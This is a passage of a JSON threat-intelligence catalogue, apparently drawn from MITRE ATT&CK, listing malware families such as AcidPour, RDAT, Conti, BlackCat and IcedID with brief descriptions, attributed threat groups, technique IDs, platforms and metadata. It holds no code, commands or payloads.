      "description": "[AcidPour](https://attack.mitre.org/software/S1167) is a variant of [AcidRain](https://attack.mitre.org/software/S1125) designed to impact a wider range of x86 architecture Linux devices. [AcidPour](https://attack.mitre.org/software/S1167) is an x86 ELF binary that expands on the targeted devices and locations in [AcidRain](https://attack.mitre.org/software/S1125) by including items such as Unsorted Block Image (UBI), Deice Mapper (DM), and various flash memory references. Based on this expanded targeting, [AcidPour](https://attack.mitre.org/software/S1167) can impact a variety of device types including IoT, networking, and ICS embedded device types.(Citation: SentinelOne AcidPour 2024) [AcidPour](https://attack.mitre.org/software/S1167) is a wiping payload associated with the [Sandworm Team](https://attack.mitre.org/groups/G0034) threat actor, and potentially linked to attacks against Ukrainian internet service providers (ISPs) in 2023.(Citation: CERT-UA TelecomAttack 2023)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1529",
        "T1120",
        "T1082",
        "T1561.001",
        "T1083",
        "T1070.004",
        "T1485"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S1167",
      "stix_id": "malware--4b1b3a36-bbd6-462c-9c03-7fd4fb5e0dfa",
      "created": "2024-11-25T15:12:27.497000+00:00",
      "modified": "2025-04-17T20:50:18.470000+00:00"
    },
    "S0495": {
      "id": "S0495",
      "name": "RDAT",
      "description": "[RDAT](https://attack.mitre.org/software/S0495) is a backdoor used by the suspected Iranian threat group [OilRig](https://attack.mitre.org/groups/G0049). [RDAT](https://attack.mitre.org/software/S0495) was originally identified in 2017 and targeted companies in the telecommunications sector.(Citation: Unit42 RDAT July 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1027.003",
        "T1036.004",
        "T1059.003",
        "T1071.004",
        "T1036.005",
        "T1113",
        "T1132.001",
        "T1132.002",
        "T1543.003",
        "T1140",
        "T1573.001",
        "T1071.003",
        "T1001.002",
        "T1030",
        "T1105",
        "T1070.004",
        "T1041",
        "T1008",
        "T1001"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0495",
      "stix_id": "malware--4b346d12-7f91-48d2-8f06-b26ffa0d825b",
      "created": "2020-07-28T17:26:36.168000+00:00",
      "modified": "2025-04-25T14:43:13.198000+00:00"
    },
    "S0047": {
      "id": "S0047",
      "name": "Hacking Team UEFI Rootkit",
      "description": "[Hacking Team UEFI Rootkit](https://attack.mitre.org/software/S0047) is a rootkit developed by the company Hacking Team as a method of persistence for remote access software. (Citation: TrendMicro Hacking Team UEFI)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1014",
        "T1542.001"
      ],
      "platforms": [],
      "url": "https://attack.mitre.org/software/S0047",
      "stix_id": "malware--4b62ab58-c23b-4704-9c15-edd568cd59f8",
      "created": "2017-05-31T21:32:35.389000+00:00",
      "modified": "2025-04-25T14:43:13.563000+00:00"
    },
    "S0468": {
      "id": "S0468",
      "name": "Skidmap",
      "description": "[Skidmap](https://attack.mitre.org/software/S0468) is a kernel-mode rootkit used for cryptocurrency mining.(Citation: Trend Micro Skidmap)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1496.001",
        "T1098.004",
        "T1105",
        "T1027.013",
        "T1036.005",
        "T1053.003",
        "T1083",
        "T1518.001",
        "T1547.006",
        "T1556.003",
        "T1082",
        "T1014",
        "T1057",
        "T1140",
        "T1059.004",
        "T1562.001"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0468",
      "stix_id": "malware--4b68b5ea-2e1b-4225-845b-8632f702b9a0",
      "created": "2020-06-09T21:23:38.995000+00:00",
      "modified": "2024-04-11T00:06:31.222000+00:00"
    },
    "S0439": {
      "id": "S0439",
      "name": "Okrum",
      "description": "[Okrum](https://attack.mitre.org/software/S0439) is a Windows backdoor that has been seen in use since December 2016 with strong links to [Ke3chang](https://attack.mitre.org/groups/G0004).(Citation: ESET Okrum July 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1003.005",
        "T1547.009",
        "T1560.001",
        "T1497.001",
        "T1497.002",
        "T1105",
        "T1059.003",
        "T1497.003",
        "T1543.003",
        "T1016",
        "T1071.001",
        "T1001",
        "T1053.005",
        "T1027.003",
        "T1036.004",
        "T1033",
        "T1082",
        "T1041",
        "T1132.001",
        "T1569.002",
        "T1134.001",
        "T1083",
        "T1564.001",
        "T1090.002",
        "T1573.001",
        "T1140",
        "T1070.004",
        "T1547.001",
        "T1049",
        "T1560.003",
        "T1056.001",
        "T1124",
        "T1003.001",
        "T1001.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0439",
      "stix_id": "malware--4b6ec280-7bbb-48ff-ae59-b189520ebe83",
      "created": "2020-05-06T21:12:31.535000+00:00",
      "modified": "2025-04-25T14:43:14.113000+00:00"
    },
    "S1201": {
      "id": "S1201",
      "name": "TRANSLATEXT",
      "description": "[TRANSLATEXT](https://attack.mitre.org/software/S1201) is malware that is believed to be used by [Kimsuky](https://attack.mitre.org/groups/G0094).(Citation: Zscaler Kimsuky TRANSLATEXT) [TRANSLATEXT](https://attack.mitre.org/software/S1201) masqueraded as a Google Translate extension for Google Chrome, but is actually a collection of four malicious Javascript files that perform defense evasion, information collection and exfiltration.(Citation: Zscaler Kimsuky TRANSLATEXT) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.001",
        "T1555.003",
        "T1059.001",
        "T1041",
        "T1112",
        "T1185",
        "T1102.001",
        "T1539",
        "T1113",
        "T1176.001",
        "T1036.005",
        "T1114",
        "T1102.002",
        "T1012",
        "T1205"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1201",
      "stix_id": "malware--4b72b6a7-72be-45d9-af02-fdcf0fc6d358",
      "created": "2025-01-29T21:22:34.134000+00:00",
      "modified": "2025-02-05T16:43:18.233000+00:00"
    },
    "S0019": {
      "id": "S0019",
      "name": "Regin",
      "description": "[Regin](https://attack.mitre.org/software/S0019) is a malware platform that has targeted victims in a range of industries, including telecom, government, and financial institutions. Some [Regin](https://attack.mitre.org/software/S0019) timestamps date back to 2003. (Citation: Kaspersky Regin)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1564.004",
        "T1564.005",
        "T1071.001",
        "T1056.001",
        "T1036.001",
        "T1090.002",
        "T1071.002",
        "T1021.002",
        "T1095",
        "T1040",
        "T1112"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0019",
      "stix_id": "malware--4c59cce8-cb48-4141-b9f1-f646edfaadb0",
      "created": "2017-05-31T21:32:17.959000+00:00",
      "modified": "2023-10-01T02:47:21.211000+00:00"
    },
    "S0486": {
      "id": "S0486",
      "name": "Bonadan",
      "description": "[Bonadan](https://attack.mitre.org/software/S0486) is a malicious version of OpenSSH which acts as a custom backdoor. [Bonadan](https://attack.mitre.org/software/S0486) has been active since at least 2018 and combines a new cryptocurrency-mining module with the same credential-stealing module used by the Onderon family of backdoors.(Citation: ESET ForSSHe December 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1573.001",
        "T1082",
        "T1016",
        "T1496.001",
        "T1554",
        "T1105",
        "T1033",
        "T1059",
        "T1057"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0486",
      "stix_id": "malware--4c6d62c2-89f5-4159-8fab-0190b1f9d328",
      "created": "2020-07-16T14:59:40.051000+00:00",
      "modified": "2025-04-25T14:43:14.836000+00:00"
    },
    "S1186": {
      "id": "S1186",
      "name": "Line Dancer",
      "description": "[Line Dancer](https://attack.mitre.org/software/S1186) is a memory-only Lua-based shellcode loader associated with the [ArcaneDoor](https://attack.mitre.org/campaigns/C0046) campaign. [Line Dancer](https://attack.mitre.org/software/S1186) allows an adversary to upload and execute arbitrary shellcode on victim devices.(Citation: Cisco ArcaneDoor 2024)(Citation: CCCS ArcaneDoor 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1562.003",
        "T1041",
        "T1071.001",
        "T1014",
        "T1653",
        "T1040",
        "T1059.008",
        "T1082"
      ],
      "platforms": [
        "Network Devices"
      ],
      "url": "https://attack.mitre.org/software/S1186",
      "stix_id": "malware--4c8ad4ed-3bbb-4088-bf14-f4caf2bf62a0",
      "created": "2025-01-06T16:31:21.533000+00:00",
      "modified": "2025-04-15T19:46:34.123000+00:00"
    },
    "S0370": {
      "id": "S0370",
      "name": "SamSam",
      "description": "[SamSam](https://attack.mitre.org/software/S0370) is ransomware that appeared in early 2016. Unlike some ransomware, its variants have required operators to manually interact with the malware to execute some of its core components.(Citation: US-CERT SamSam 2018)(Citation: Talos SamSam Jan 2018)(Citation: Sophos SamSam Apr 2018)(Citation: Symantec SamSam Oct 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1070.004",
        "T1027.013",
        "T1059.003",
        "T1027.016",
        "T1486"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0370",
      "stix_id": "malware--4d56e6e9-1a6d-46e3-896c-dfdf3cc96e62",
      "created": "2019-04-15T19:40:07.664000+00:00",
      "modified": "2024-04-11T00:09:42.414000+00:00"
    },
    "S0691": {
      "id": "S0691",
      "name": "Neoichor",
      "description": "[Neoichor](https://attack.mitre.org/software/S0691) is C2 malware used by [Ke3chang](https://attack.mitre.org/groups/G0004) since at least 2019; similar malware families used by the group include Leeson and Numbldea.(Citation: Microsoft NICKEL December 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016.001",
        "T1105",
        "T1614.001",
        "T1033",
        "T1112",
        "T1005",
        "T1016",
        "T1082",
        "T1559.001",
        "T1071.001",
        "T1070"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0691",
      "stix_id": "malware--4d7bf2ac-f953-4907-b114-be44dc174d67",
      "created": "2022-03-22T17:22:38.233000+00:00",
      "modified": "2025-04-16T20:38:06.261000+00:00"
    },
    "S0575": {
      "id": "S0575",
      "name": "Conti",
      "description": "[Conti](https://attack.mitre.org/software/S0575) is a Ransomware-as-a-Service (RaaS) that was first observed in December 2019. [Conti](https://attack.mitre.org/software/S0575) has been deployed via [TrickBot](https://attack.mitre.org/software/S0266) and used against major corporations and government agencies, particularly those in North America. As with other ransomware families, actors using [Conti](https://attack.mitre.org/software/S0575) steal sensitive files and information from compromised networks, and threaten to publish this data unless the ransom is paid.(Citation: Cybereason Conti Jan 2021)(Citation: CarbonBlack Conti July 2020)(Citation: Cybleinc Conti January 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1021.002",
        "T1135",
        "T1140",
        "T1489",
        "T1083",
        "T1016",
        "T1486",
        "T1018",
        "T1027",
        "T1490",
        "T1049",
        "T1055.001",
        "T1080",
        "T1059.003",
        "T1057",
        "T1106"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0575",
      "stix_id": "malware--4dea7d8e-af94-4bfb-afe4-7ff54f59308b",
      "created": "2021-02-17T18:51:57.710000+00:00",
      "modified": "2025-04-16T20:38:06.412000+00:00"
    },
    "S1130": {
      "id": "S1130",
      "name": "Raspberry Robin",
      "description": "[Raspberry Robin](https://attack.mitre.org/software/S1130) is initial access malware first identified in September 2021, and active through early 2024. The malware is notable for spreading via infected USB devices containing a malicious LNK object that, on execution, retrieves remote hosted payloads for installation. [Raspberry Robin](https://attack.mitre.org/software/S1130) has been widely used against various industries and geographies, and as a precursor to information stealer, ransomware, and other payloads such as [SocGholish](https://attack.mitre.org/software/S1124), [Cobalt Strike](https://attack.mitre.org/software/S0154), [IcedID](https://attack.mitre.org/software/S0483), and [Bumblebee](https://attack.mitre.org/software/S1039).(Citation: TrendMicro RaspberryRobin 2022)(Citation: RedCanary RaspberryRobin 2022)(Citation: HP RaspberryRobin 2024) The DLL componenet in the [Raspberry Robin](https://attack.mitre.org/software/S1130) infection chain is also referred to as \"Roshtyak.\"(Citation: Avast RaspberryRobin 2022) The name \"Raspberry Robin\" is used to refer to both the malware as well as the threat actor associated with its use, although the Raspberry Robin operators are also tracked as <code>Storm-0856</code> by some vendors.(Citation: Microsoft RaspberryRobin 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1518.001",
        "T1082",
        "T1027.002",
        "T1102",
        "T1480",
        "T1547.001",
        "T1559",
        "T1571",
        "T1497",
        "T1036.004",
        "T1218.010",
        "T1033",
        "T1105",
        "T1574",
        "T1036.008",
        "T1091",
        "T1071.001",
        "T1055.012",
        "T1583.001",
        "T1574.001",
        "T1057",
        "T1562.001",
        "T1047",
        "T1559.001",
        "T1083",
        "T1059.003",
        "T1218.008",
        "T1218.011",
        "T1548",
        "T1204",
        "T1622",
        "T1583.008",
        "T1070.004",
        "T1140",
        "T1497.001",
        "T1070.009",
        "T1071",
        "T1548.002",
        "T1027",
        "T1218.007",
        "T1059"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1130",
      "stix_id": "malware--4e385fa6-ebe0-43fc-9ccf-5b51b5dc4d79",
      "created": "2024-05-17T13:11:28.925000+00:00",
      "modified": "2024-07-23T18:47:58.066000+00:00"
    },
    "S1122": {
      "id": "S1122",
      "name": "Mispadu",
      "description": "[Mispadu](https://attack.mitre.org/software/S1122) is a banking trojan written in Delphi that was first observed in 2019 and uses a Malware-as-a-Service (MaaS) business model.(Citation: ESET Security Mispadu Facebook Ads 2019)(Citation: SCILabs Malteiro 2021) This malware is operated, managed, and sold by the [Malteiro](https://attack.mitre.org/groups/G1026) cybercriminal group.(Citation: SCILabs Malteiro 2021) [Mispadu](https://attack.mitre.org/software/S1122) has mainly been used to target victims in Brazil and Mexico, and has also had confirmed operations throughout Latin America and Europe.(Citation: SCILabs Malteiro 2021)(Citation: SCILabs URSA/Mispadu Evolution 2023)(Citation: Seguran\u00e7a Inform\u00e1tica URSA Sophisticated Loader 2020) ",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1140",
        "T1555.003",
        "T1113",
        "T1218.007",
        "T1614.001",
        "T1176.001",
        "T1217",
        "T1566.002",
        "T1082",
        "T1204.002",
        "T1106",
        "T1218.011",
        "T1056.001",
        "T1547.001",
        "T1027.013",
        "T1055",
        "T1518.001",
        "T1056.002",
        "T1057",
        "T1497.001",
        "T1083",
        "T1041",
        "T1573.002",
        "T1115",
        "T1555",
        "T1059.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1122",
      "stix_id": "malware--4e6464d2-69df-4e56-8d4c-1973f84d7b80",
      "created": "2024-03-13T20:59:22.655000+00:00",
      "modified": "2024-04-18T14:15:33.229000+00:00"
    },
    "S0166": {
      "id": "S0166",
      "name": "RemoteCMD",
      "description": "[RemoteCMD](https://attack.mitre.org/software/S0166) is a custom tool used by [APT3](https://attack.mitre.org/groups/G0022) to execute commands on a remote system similar to SysInternal's PSEXEC functionality. (Citation: Symantec Buckeye)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1569.002",
        "T1053.005",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0166",
      "stix_id": "malware--4e6b9625-bbda-4d96-a652-b3bb45453f26",
      "created": "2018-01-16T16:13:52.465000+00:00",
      "modified": "2025-04-25T14:43:16.265000+00:00"
    },
    "S1191": {
      "id": "S1191",
      "name": "Megazord",
      "description": "[Megazord](https://attack.mitre.org/software/S1191) is a Rust-based variant of [Akira](https://attack.mitre.org/software/S1129) ransomware that has been in use since at least August 2023 to target Windows environments. [Megazord](https://attack.mitre.org/software/S1191) has been attributed to the [Akira](https://attack.mitre.org/groups/G1024) group based on overlapping infrastructure though is possibly not exclusive to the group.(Citation: CISA Akira Ransomware APR 2024)(Citation: Cisco Akira Ransomware OCT 2024)(Citation: Palo Alto Howling Scorpius DEC 2024)\n\n",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1489",
        "T1654",
        "T1057",
        "T1486",
        "T1083"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1191",
      "stix_id": "malware--4e762e29-3c56-4a2b-b205-c5890c0856ed",
      "created": "2025-01-08T21:31:29.913000+00:00",
      "modified": "2025-03-11T15:37:31.186000+00:00"
    },
    "S0659": {
      "id": "S0659",
      "name": "Diavol",
      "description": "[Diavol](https://attack.mitre.org/software/S0659) is a ransomware variant first observed in June 2021 that is capable of prioritizing file types to encrypt based on a pre-configured list of extensions defined by the attacker.  The [Diavol](https://attack.mitre.org/software/S0659) Ransomware-as-a Service (RaaS) program is managed by [Wizard Spider](https://attack.mitre.org/groups/G0102) and it has been observed being deployed by [Bazar](https://attack.mitre.org/software/S0534).(Citation: Fortinet Diavol July 2021)(Citation: FBI Flash Diavol January 2022)(Citation: DFIR Diavol Ransomware December 2021)(Citation: Microsoft Ransomware as a Service)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1485",
        "T1562.001",
        "T1033",
        "T1486",
        "T1489",
        "T1083",
        "T1071.001",
        "T1057",
        "T1135",
        "T1021.002",
        "T1491.001",
        "T1027.003",
        "T1016",
        "T1027",
        "T1018",
        "T1106",
        "T1082",
        "T1105",
        "T1490"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0659",
      "stix_id": "malware--4e9bdf9a-4957-47f6-87b3-c76898d3f623",
      "created": "2021-11-12T19:02:16.381000+00:00",
      "modified": "2024-11-17T20:10:33.591000+00:00"
    },
    "S0565": {
      "id": "S0565",
      "name": "Raindrop",
      "description": "[Raindrop](https://attack.mitre.org/software/S0565) is a loader used by [APT29](https://attack.mitre.org/groups/G0016) that was discovered on some victim machines during investigations related to the [SolarWinds Compromise](https://attack.mitre.org/campaigns/C0024). It was discovered in January 2021 and was likely used since at least May 2020.(Citation: Symantec RAINDROP January 2021)(Citation: Microsoft Deep Dive Solorigate January 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1497.003",
        "T1027.013",
        "T1027.002",
        "T1036",
        "T1036.005",
        "T1027.003",
        "T1140"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0565",
      "stix_id": "malware--4efc3e00-72f2-466a-ab7c-8a7dc6603b19",
      "created": "2021-01-19T19:43:27.828000+00:00",
      "modified": "2024-04-11T00:23:21.599000+00:00"
    },
    "S0600": {
      "id": "S0600",
      "name": "Doki",
      "description": "[Doki](https://attack.mitre.org/software/S0600) is a backdoor that uses a unique Dogecoin-based Domain Generation Algorithm and was first observed in July 2020. [Doki](https://attack.mitre.org/software/S0600) was used in conjunction with the [ngrok](https://attack.mitre.org/software/S0508) Mining Botnet in a campaign that targeted Docker servers in cloud platforms. (Citation: Intezer Doki July 20)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1568.002",
        "T1611",
        "T1020",
        "T1573.002",
        "T1041",
        "T1105",
        "T1610",
        "T1059.004",
        "T1083",
        "T1071.001",
        "T1102",
        "T1036.005",
        "T1133",
        "T1057"
      ],
      "platforms": [
        "Linux",
        "Containers"
      ],
      "url": "https://attack.mitre.org/software/S0600",
      "stix_id": "malware--4f1c389e-a80e-4a3e-9b0e-9be8c91df64f",
      "created": "2021-04-06T15:53:34.722000+00:00",
      "modified": "2025-04-25T14:43:17.148000+00:00"
    },
    "S0146": {
      "id": "S0146",
      "name": "TEXTMATE",
      "description": "[TEXTMATE](https://attack.mitre.org/software/S0146) is a second-stage PowerShell backdoor that is memory-resident. It was observed being used along with [POWERSOURCE](https://attack.mitre.org/software/S0145) in February 2017. (Citation: FireEye FIN7 March 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1071.004",
        "T1059.003"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0146",
      "stix_id": "malware--4f6aa78c-c3d4-4883-9840-96ca2f5d6d47",
      "created": "2017-05-31T21:33:25.209000+00:00",
      "modified": "2025-04-16T20:38:06.918000+00:00"
    },
    "S0623": {
      "id": "S0623",
      "name": "Siloscape",
      "description": "[Siloscape](https://attack.mitre.org/software/S0623) is malware that targets Kubernetes clusters through Windows containers. [Siloscape](https://attack.mitre.org/software/S0623) was first observed in March 2021.(Citation: Unit 42 Siloscape Jun 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1518",
        "T1190",
        "T1090.003",
        "T1611",
        "T1071",
        "T1140",
        "T1059.003",
        "T1068",
        "T1083",
        "T1027",
        "T1609",
        "T1069",
        "T1134.001",
        "T1106"
      ],
      "platforms": [
        "Windows",
        "Containers"
      ],
      "url": "https://attack.mitre.org/software/S0623",
      "stix_id": "malware--4fbd565b-bf55-4ac7-80b4-b183a7b64b9c",
      "created": "2021-06-18T15:26:55.509000+00:00",
      "modified": "2025-04-25T14:43:17.695000+00:00"
    },
    "S1068": {
      "id": "S1068",
      "name": "BlackCat",
      "description": "[BlackCat](https://attack.mitre.org/software/S1068) is ransomware written in Rust that has been offered via the Ransomware-as-a-Service (RaaS) model. First observed November 2021, [BlackCat](https://attack.mitre.org/software/S1068) has been used to target multiple sectors and organizations in various countries and regions in Africa, the Americas, Asia, Australia, and Europe.(Citation: Microsoft BlackCat Jun 2022)(Citation: Sophos BlackCat Jul 2022)(Citation: ACSC BlackCat Apr 2022)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1570",
        "T1018",
        "T1486",
        "T1489",
        "T1082",
        "T1548.002",
        "T1087.002",
        "T1112",
        "T1069.002",
        "T1070.001",
        "T1047",
        "T1135",
        "T1222.001",
        "T1491.001",
        "T1561.001",
        "T1059.003",
        "T1083",
        "T1033",
        "T1490",
        "T1134"
      ],
      "platforms": [
        "Linux",
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1068",
      "stix_id": "malware--50c44c34-3abb-48ae-9433-a2337de5b0bc",
      "created": "2023-02-28T20:50:36.164000+00:00",
      "modified": "2025-04-16T20:38:07.230000+00:00"
    },
    "S0410": {
      "id": "S0410",
      "name": "Fysbis",
      "description": "[Fysbis](https://attack.mitre.org/software/S0410) is a Linux-based backdoor used by [APT28](https://attack.mitre.org/groups/G0007) that dates back to at least 2014.(Citation: Fysbis Palo Alto Analysis)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1132.001",
        "T1083",
        "T1056.001",
        "T1036.004",
        "T1057",
        "T1027.013",
        "T1070.004",
        "T1082",
        "T1543.002",
        "T1036.005",
        "T1547.013",
        "T1059.004"
      ],
      "platforms": [
        "Linux"
      ],
      "url": "https://attack.mitre.org/software/S0410",
      "stix_id": "malware--50d6688b-0985-4f3d-8cbe-0c796b30703b",
      "created": "2019-09-12T17:40:38.303000+00:00",
      "modified": "2024-04-11T02:29:45.766000+00:00"
    },
    "S0483": {
      "id": "S0483",
      "name": "IcedID",
      "description": "[IcedID](https://attack.mitre.org/software/S0483) is a modular banking malware designed to steal financial information that has been observed in the wild since at least 2017.  [IcedID](https://attack.mitre.org/software/S0483)  has been downloaded by [Emotet](https://attack.mitre.org/software/S0367) in multiple campaigns.(Citation: IBM IcedID November 2017)(Citation: Juniper IcedID June 2020)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1497",
        "T1055.012",
        "T1614.001",
        "T1482",
        "T1218.007",
        "T1189",
        "T1048.002",
        "T1069",
        "T1053.005",
        "T1218.011",
        "T1036.005",
        "T1204.002",
        "T1518.001",
        "T1027.009",
        "T1027.013",
        "T1106",
        "T1027.003",
        "T1087.002",
        "T1047",
        "T1059.005",
        "T1055.004",
        "T1105",
        "T1016",
        "T1566.001",
        "T1071.001",
        "T1135",
        "T1185",
        "T1547.001",
        "T1027.002",
        "T1082",
        "T1573.002"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0483",
      "stix_id": "malware--5147ef15-1cae-4707-8ea1-bee8d98b7f1d",
      "created": "2020-07-15T17:55:11.252000+00:00",
      "modified": "2025-04-22T22:16:09.049000+00:00"
    },
    "S0257": {
      "id": "S0257",
      "name": "VERMIN",
      "description": "[VERMIN](https://attack.mitre.org/software/S0257) is a remote access tool written in the Microsoft .NET framework. It is mostly composed of original code, but also has some open source code. (Citation: Unit 42 VERMIN Jan 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1016",
        "T1027.002",
        "T1071.001",
        "T1123",
        "T1070.004",
        "T1056.001",
        "T1518.001",
        "T1115",
        "T1140",
        "T1119",
        "T1560",
        "T1113",
        "T1027.013",
        "T1105",
        "T1033",
        "T1082",
        "T1057"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0257",
      "stix_id": "malware--5189f018-fea2-45d7-b0ed-23f9ee0a46f3",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2024-04-10T22:17:02.480000+00:00"
    },
    "S0333": {
      "id": "S0333",
      "name": "UBoatRAT",
      "description": "[UBoatRAT](https://attack.mitre.org/software/S0333) is a remote access tool that was identified in May 2017.(Citation: PaloAlto UBoatRAT Nov 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1059.003",
        "T1102.002",
        "T1197",
        "T1071.001",
        "T1497.001",
        "T1057",
        "T1573.001",
        "T1105"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0333",
      "stix_id": "malware--518bb5f1-91f4-4ff2-b09d-5a94e1ebe95f",
      "created": "2019-01-29T19:09:26.355000+00:00",
      "modified": "2024-04-10T22:22:03.759000+00:00"
    },
    "S1147": {
      "id": "S1147",
      "name": "Nightdoor",
      "description": "[Nightdoor](https://attack.mitre.org/software/S1147) is a backdoor exclusively associated with [Daggerfly](https://attack.mitre.org/groups/G1034) operations. [Nightdoor](https://attack.mitre.org/software/S1147) uses common libraries with [MgBot](https://attack.mitre.org/software/S1146) and [MacMa](https://attack.mitre.org/software/S1016), linking these malware families together.(Citation: ESET EvasivePanda 2024)(Citation: Symantec Daggerfly 2024)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1102",
        "T1057",
        "T1053.005",
        "T1059.003",
        "T1574",
        "T1497.001",
        "T1124",
        "T1016",
        "T1070.004",
        "T1033",
        "T1082",
        "T1140",
        "T1071"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S1147",
      "stix_id": "malware--51f78dfc-52f9-424e-8753-bb4246188313",
      "created": "2024-07-25T22:12:08.779000+00:00",
      "modified": "2024-10-10T14:35:13.781000+00:00"
    },
    "S0652": {
      "id": "S0652",
      "name": "MarkiRAT",
      "description": "[MarkiRAT](https://attack.mitre.org/software/S0652) is a remote access Trojan (RAT) compiled with Visual Studio that has been used by [Ferocious Kitten](https://attack.mitre.org/groups/G0137) since at least 2015.(Citation: Kaspersky Ferocious Kitten Jun 2021)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1197",
        "T1614.001",
        "T1033",
        "T1083",
        "T1106",
        "T1105",
        "T1547.009",
        "T1005",
        "T1056.001",
        "T1547.001",
        "T1059.003",
        "T1518.001",
        "T1082",
        "T1041",
        "T1555.005",
        "T1036.005",
        "T1057",
        "T1074.001",
        "T1071.001",
        "T1518",
        "T1115",
        "T1113"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0652",
      "stix_id": "malware--532c6004-b1e8-415b-9516-f7c14ba783b1",
      "created": "2021-09-28T17:48:36.547000+00:00",
      "modified": "2025-04-25T14:43:19.128000+00:00"
    },
    "S0441": {
      "id": "S0441",
      "name": "PowerShower",
      "description": "[PowerShower](https://attack.mitre.org/software/S0441) is a PowerShell backdoor used by [Inception](https://attack.mitre.org/groups/G0100) for initial reconnaissance and to download and execute second stage payloads.(Citation: Unit 42 Inception November 2018)(Citation: Kaspersky Cloud Atlas August 2019)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1082",
        "T1070.004",
        "T1057",
        "T1059.001",
        "T1547.001",
        "T1041",
        "T1132.001",
        "T1071.001",
        "T1112",
        "T1016",
        "T1033",
        "T1564.003",
        "T1560.001",
        "T1059.005"
      ],
      "platforms": [
        "Windows"
      ],
      "url": "https://attack.mitre.org/software/S0441",
      "stix_id": "malware--53486bc7-7748-4716-8190-e4f1fde04c53",
      "created": "2020-05-08T19:27:12.414000+00:00",
      "modified": "2025-04-25T14:43:19.493000+00:00"
    },
    "S0265": {
      "id": "S0265",
      "name": "Kazuar",
      "description": "[Kazuar](https://attack.mitre.org/software/S0265) is a fully featured, multi-platform backdoor Trojan written using the Microsoft .NET framework. (Citation: Unit 42 Kazuar May 2017)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1547.001",
        "T1105",
        "T1485",
        "T1070.004",
        "T1027",
        "T1132.001",
        "T1057",
        "T1083",
        "T1033",
        "T1090.001",
        "T1069.001",
        "T1125",
        "T1059.004",
        "T1055.001",
        "T1071.002",
        "T1543.003",
        "T1082",
        "T1102.002",
        "T1008",
        "T1071.001",
        "T1010",
        "T1113",
        "T1029",
        "T1087.001",
        "T1074.001",
        "T1005",
        "T1016",
        "T1047",
        "T1547.009",
        "T1059.003"
      ],
      "platforms": [
        "Windows",
        "macOS"
      ],
      "url": "https://attack.mitre.org/software/S0265",
      "stix_id": "malware--536be338-e2ef-4a6b-afb6-8d5568b91eb2",
      "created": "2018-10-17T00:14:20.652000+00:00",
      "modified": "2025-04-25T14:43:19.859000+00:00"
    },
    "S0247": {
      "id": "S0247",
      "name": "NavRAT",
      "description": "[NavRAT](https://attack.mitre.org/software/S0247) is a remote access tool designed to upload, download, and execute files. It has been observed in attacks targeting South Korea. (Citation: Talos NavRAT May 2018)",
      "type": "malware",
      "aliases": [],
      "techniques": [
        "T1074.001",
        "T1105",
        "T1071.003",
        "T1055",
        "T1082",
        "T1056.001",
